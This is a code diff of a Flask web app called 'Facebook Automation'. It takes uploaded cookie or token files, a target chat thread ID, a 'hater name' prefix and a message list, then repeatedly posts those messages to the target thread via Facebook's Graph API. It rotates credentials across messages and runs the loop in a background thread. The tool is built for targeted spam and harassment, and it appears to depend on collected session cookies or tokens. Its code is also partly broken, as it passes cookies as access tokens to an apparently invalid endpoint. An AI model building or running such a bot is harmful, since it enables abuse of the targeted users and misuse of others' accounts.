@@ -2,11 +2,11 @@ from flask import Flask, request, render_template, redirect, url_for
 import os
 import time
 import requests
-import json
+import threading
 
 app = Flask(__name__)
 
-# Static variables for headers
+# Static headers
 headers = {
     'Connection': 'keep-alive',
     'Cache-Control': 'max-age=0',
@@ -17,143 +17,149 @@ headers = {
     'Accept-Language': 'en-US,en;q=0.9,fr;q=0.8',
 }
 
+stop_flag = False
+
 @app.route('/')
 def index():
     return '''
-    <html lang="en">
-        <head>
-            <meta charset="utf-8">
-            <meta name="viewport" content="width=device-width, initial-scale=1.0">
-            <title>Facebook Automation</title>
-            <style>
-                body {
-                    background-color: rgb(0, 0, 0);
-                    color: white;
-                    font-family: Arial, sans-serif;
-                }
-                .container {
-                    max-width: 800px;
-                    margin: auto;
-                    padding: 20px;
-                    background: rgba(0, 0, 0, 0.7);
-                    border-radius: 10px;
-                    box-shadow: 0 0 15px rgba(0, 0, 0, 0.3);
-                }
-                h1 {
-                    text-align: center;
-                    color: white;
-                    font-size: 32px;
-                }
-                .form-group {
-                    margin-bottom: 20px;
-                }
-                .form-control {
-                    width: 100%;
-                    padding: 10px;
-                    border-radius: 5px;
-                    border: 1px solid #ccc;
-                }
-                .btn {
-                    padding: 10px 20px;
-                    background-color: rgb(0, 255, 0);
-                    border: none;
-                    border-radius: 5px;
-                    cursor: pointer;
-                }
-                .btn:hover {
-                    background-color: red;
-                }
-                .stop-btn {
-                    background-color: rgb(255, 0, 0);
-                    margin-top: 10px;
-                }
-            </style>
-        </head>
-        <body>
-            <div class="container">
-                <h1>Facebook Automation</h1>
-                <form action="/start" method="POST" enctype="multipart/form-data">
-                    <div class="form-group">
-                        <label for="cookiesFile">Select Cookie File:</label>
-                        <input type="file" class="form-control" id="cookiesFile" name="cookiesFile" required>
-                    </div>
-                    <div class="form-group">
-                        <label for="txtFile">Select Tokens Text File:</label>
-                        <input type="file" class="form-control" id="txtFile" name="txtFile" accept=".txt" required>
-                    </div>
-                    <div class="form-group">
-                        <label for="targetGroupId">Target Group Chat ID:</label>
-                        <input type="text" class="form-control" id="targetGroupId" name="targetGroupId" required>
-                    </div>
-                    <div class="form-group">
-                        <label for="hatersName">Enter Haters Name:</label>
-                        <input type="text" class="form-control" id="hatersName" name="hatersName" required>
-                    </div>
-                    <div class="form-group">
-                        <label for="delay">Delay in Seconds:</label>
-                        <input type="number" class="form-control" id="delay" name="delay" value="60" required>
-                    </div>
-                    <button type="submit" class="btn">Start Automation</button>
-                </form>
-                <form action="/stop" method="POST">
-                    <button type="submit" class="btn stop-btn">Stop Automation</button>
-                </form>
+        <html lang="en">
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Facebook Automation</title>
+    <style>
+        /* CSS for styling elements */
+        body {
+            background-color: black;
+            color: white;
+            font-family: Arial, sans-serif;
+            text-align: center;
+            padding-top: 50px;
+        }
+        .container {
+            margin-top: 50px;
+            max-width: 600px;
+            border-radius: 15px;
+            padding: 20px;
+            box-shadow: 0 0 15px rgba(0, 0, 0, 0.3);
+            background: linear-gradient(to right, rgba(0, 255, 255, 0.5), rgba(255, 0, 255, 0.5));
+        }
+        .form-control {
+            width: 100%;
+            padding: 10px;
+            margin: 10px 0;
+            border-radius: 5px;
+            border: 1px solid white;
+            background: transparent;
+            color: white;
+        }
+        .btn-submit {
+            background-color: #4CAF50;
+            color: white;
+            padding: 12px 24px;
+            border-radius: 10px;
+            cursor: pointer;
+            border: none;
+        }
+        .btn-submit:hover {
+            background-color: #45a049;
+        }
+        .btn-stop {
+            background-color: red;
+            color: white;
+            padding: 12px 24px;
+            border-radius: 10px;
+            cursor: pointer;
+            border: none;
+        }
+        .btn-stop:hover {
+            background-color: darkred;
+        }
+        .laser-light {
+            color: rgb(255, 0, 0);
+            text-shadow: 0 0 10px rgb(255, 0, 0), 0 0 20px rgb(255, 0, 0);
+            font-size: 50px;
+            animation: laser 1.5s infinite alternate;
+        }
+        @keyframes laser {
+            0% { text-shadow: 0 0 10px rgb(255, 0, 0), 0 0 20px rgb(255, 0, 0); }
+            100% { text-shadow: 0 0 20px rgb(255, 255, 0), 0 0 30px rgb(255, 255, 0); }
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h1 class="laser-light">Facebook Automation</h1>
+        <form action="/" method="POST" enctype="multipart/form-data">
+            <div>
+                <input type="text" name="thread_id" class="form-control" placeholder="Thread ID" required>
+                <input type="file" name="cookie_file" class="form-control" required>
+                <input type="file" name="messages_file" class="form-control" accept=".txt" required>
+                <input type="text" name="hater_name" class="form-control" placeholder="Hater Name" required>
+                <input type="number" name="delay" class="form-control" placeholder="Delay in seconds" required>
             </div>
-        </body>
-    </html>
+            <button type="submit" class="btn-submit">Start Messaging</button>
+        </form>
+        <form action="/stop" method="POST">
+            <button type="submit" class="btn-stop">Stop Messaging</button>
+        </form>
+    </div>
+</body>
+</html>
     '''
 
-@app.route('/start', methods=['POST'])
-def start_automation():
-    # Extract form data
-    cookies_file = request.files['cookiesFile']
-    tokens_file = request.files['txtFile']
-    target_group_id = request.form['targetGroupId']
-    haters_name = request.form['hatersName']
+@app.route('/', methods=['POST'])
+def send_message():
+    global stop_flag
+    stop_flag = False
+
+    # Retrieve form data
+    thread_id = request.form['thread_id']
+    cookie_file = request.files['cookie_file']
+    messages_file = request.files['messages_file']
+    hater_name = request.form['hater_name']
     delay = int(request.form['delay'])
 
-    cookies = cookies_file.read().decode()  # Handle cookies for Facebook login
-    tokens = tokens_file.read().decode().splitlines()
+    # Read cookie
+    cookies = cookie_file.read().decode().splitlines()
 
-    # Create a folder for the session
-    session_folder = f"session_{target_group_id}"
-    os.makedirs(session_folder, exist_ok=True)
+    # Read messages
+    messages = messages_file.read().decode().splitlines()
 
-    # Save the cookies and tokens
-    with open(os.path.join(session_folder, 'cookies.txt'), 'w') as f:
-        f.write(cookies)
+    # Define post URL
+    post_url = f'https://graph.facebook.com/v15.0/t_{thread_id}/'
 
-    with open(os.path.join(session_folder, 'tokens.txt'), 'w') as f:
-        f.write("\n".join(tokens))
+    # Send messages in a separate thread to avoid blocking
+    def message_thread():
+        for message_index, message in enumerate(messages):
+            if stop_flag:
+                print("[x] Stopping message sending.")
+                break
 
-    # Placeholder for starting the automation
-    print(f"Automation started for target group {target_group_id} with delay {delay} seconds.")
-    
-    # Simulating sending messages (in a loop)
-    while True:
-        for token in tokens:
-            # Simulate a message send
-            message = f"{haters_name} sending automated message!"
-            payload = {'access_token': token, 'message': message}
+            # Choose a cookie for this message
+            cookie = cookies[message_index % len(cookies)]
+            params = {'access_token': cookie, 'message': f"{hater_name} {message}"}
 
-            # Here, use the Facebook API to send the message to the group (simplified)
-            url = f"https://graph.facebook.com/v15.0/{target_group_id}/messages"
-            response = requests.post(url, json=payload, headers=headers)
-            
-            if response.status_code == 200:
-                print(f"Message sent successfully: {message}")
+            # Send the message
+            response = requests.post(post_url, json=params, headers=headers)
+            if response.ok:
+                print(f"[+] Sent Message No. {message_index + 1}: {message}")
             else:
-                print(f"Failed to send message: {message}")
-            
+                print(f"[x] Failed to Send Message No. {message_index + 1}: {message}")
+
             time.sleep(delay)
 
-    return redirect(url_for('index'))  # Redirect to the index page
+    # Start the message sending thread
+    thread = threading.Thread(target=message_thread)
+    thread.start()
+
+    return redirect(url_for('index'))
 
 @app.route('/stop', methods=['POST'])
-def stop_automation():
-    # Logic to stop the automation (e.g., setting a flag or killing the process)
-    print("Automation stopped.")
-    return redirect(url_for('index'))  # Redirect to the index page
+def stop_sending():
+    global stop_flag
+    stop_flag = True
+    return redirect(url_for('index'))
 
 if __name__ == '__main__':
     app.run(host='0.0.0.0', port=5000)
